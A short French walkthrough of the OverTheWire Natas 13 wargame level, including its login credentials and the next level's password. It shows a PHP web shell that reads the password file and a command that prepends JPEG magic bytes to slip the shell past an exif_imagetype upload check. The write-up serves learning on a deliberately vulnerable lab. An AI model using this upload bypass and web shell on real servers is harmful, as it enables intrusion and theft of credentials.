## Connexion (username=natas13 password=g8ba0olAzaSJuyS4gnmbdVVigAICLG1k)
```
http://natas13.natas.labs.overthewire.org/
```

## Recherche du mot de passe
Cette fois on a une nouvelle condition:
```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```
la documentation (https://www.php.net/manual/en/function.exif-imagetype.php) indique que seulement les premiers bytes sont lu pour identifier le type de l'image.

## Concept de magic bytes
voir: https://en.wikipedia.org/wiki/List_of_file_signatures

Je vais faire le même fichier (nommé hack.php) que précédemment mais sur natas14 plutôt que 13:
```php
<?php echo shell_exec('cat /etc/natas_webpass/natas14'); ?>
```

Ensuite via mon terminal:
(printf "\xFF\xD8\xFF\xE0"; cat hack.php) > hack2.php

** Ne pas oublier de changer l'extension du fichier de la balise html
## Prochain mot de passe
```
A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
```